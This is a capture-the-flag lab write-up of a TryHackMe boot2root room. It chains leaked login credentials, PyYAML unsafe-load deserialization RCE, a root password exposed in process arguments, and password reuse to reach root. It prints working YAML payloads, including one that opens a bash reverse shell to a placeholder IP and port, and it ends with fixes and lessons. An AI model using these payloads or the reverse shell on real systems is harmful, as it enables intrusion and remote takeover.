# Beach Bar — Boot2Root (Hacker Holidays 2026, Day 5)
Path: Jr Penetration Tester | Category: Web / Boot2Root | Difficulty: Easy | Done 2026-10-05
Done from OWN PC over the THM VPN (no AttackBox). Target <ip>.

## Flags
- USER: `THM{…}`
- ROOT: `THM{…}`

## One-line memory version
> Flask /import parsed YAML with the UNSAFE loader → deserialization RCE as `bartender` → a root daemon leaked its password in `ps` (CLI args) → that password was ROOT's (reuse) → `su` to root.

## The winning chain (what WORKED)
1. **Recon** — `nmap -sT -sV -Pn --top-ports 1000 <ip>`
   - 22 SSH (OpenSSH 9.6p1), 80 HTTP **gunicorn** (= Python/Flask). Redirects to `/login`.
   - NOTE: over a VPN, use `-sT` (connect scan). Default `-sS` raw-packet scan failed with `pcap_activate(eth1) FAILED`.
2. **View source on /login** → HTML comment leaked demo creds: **`dj / <redacted-pw>`**. (Always Ctrl-U / curl the page.)
3. **Map the app** (logged in, cookie jar) → `/dashboard`, `/import`, `/export`, `/logout`.
   - Dashboard: "Export playlist as **YAML**, tweak, re-import." = the attack surface.
4. **Confirm RCE** via YAML deserialization. Field name = `playlist`:
   ```
   !!python/object/apply:subprocess.check_output [["id"]]
   ```
   → response "Loaded playlist" showed `b'uid=1001(bartender)...'`. **Reflected RCE** (output comes back → no reverse shell needed).
5. **User flag** — run via the same payload:
   `[["bash","-c","cat /home/bartender/user.txt"]]` → `THM{…}`
6. **Privesc recon** — `ps auxww` showed a ROOT process:
   `root /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass <redacted-pw> --bitrate 320k`
   → password leaked in command-line args (world-readable via ps).
7. **Credential reuse → root** — `su` (to root) with `<redacted-pw>`.
   - `su` needs a TTY, and we only had non-interactive web RCE → used a **Python `pty` trick** to fake a terminal and feed the password. Delivered the script base64-encoded to dodge quoting.
   - Result: `uid=0(root)` → `cat /root/root.txt` → `THM{…}`.

## What DIDN'T work (rabbit holes — important!)
- **sudo as bartender**: `sudo -n -l` = "a password is required"; no NOPASSWD rules; leaked password was NOT bartender's (`sudo -S` → "Sorry, try again").
- **su ubuntu** with the leaked password: "Authentication failure" (not ubuntu's password either).
- **SSH as ubuntu**: `sshd_config` had `PasswordAuthentication no` → key-only; no readable key anywhere. (Also no `plink`/`sshpass` on my Windows box; native `ssh` can't take a password non-interactively.)
- **jukeboxd.py** itself: a DECOY — just loops track names, ignores `--stream-pass`. The password was the real prize, the daemon was flavour.
- **SUID / capabilities / cron / timers**: all stock, nothing custom. No writable files not owned by us (only `/var/crash` dir).
- **app.py secrets**: only `dj:<redacted-pw>` and a fixed Flask `secret_key` (`<redacted-secret>`) — no admin user to forge, no root creds.
- **MISTAKE**: a whole-filesystem `grep /` through the web RCE **timed out the gunicorn worker (30s)** → HTTP 500. Lesson: through a web shell, keep every command fast & targeted.
- **Key realisation**: I tried the leaked password on bartender & ubuntu before root. Should spray a found credential against EVERY account (incl. root) immediately.

## Reusable technique: YAML deserialization RCE (PyYAML)
Works when the app uses `yaml.load(data, Loader=yaml.Loader)` or `yaml.unsafe_load` (NOT `safe_load`).
```yaml
# run a command, get output back
!!python/object/apply:subprocess.check_output [["id"]]
# with a shell (chain commands)
!!python/object/apply:subprocess.check_output [["bash","-c","id; cat /home/*/user.txt"]]
# os.system (no output returned, fires on load)
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"]
```
Same bug family as **pickle `__reduce__`** (AI Supply Chain module). Fix = `yaml.safe_load` (allowlist).

## Lessons → Golden Rules
- Insecure deserialization = never deserialize untrusted input (YAML/pickle/etc.). Fix is an allowlist (`safe_load`).
- Secrets in CLI args are world-readable via `ps` — never pass passwords as arguments.
- Credential reuse: try a found password on every user + service (root included) right away.
- Web RCE ≠ a comfy shell: scope commands tightly; no whole-disk scans.
- Verify a lead before investing (jukeboxd decoy).
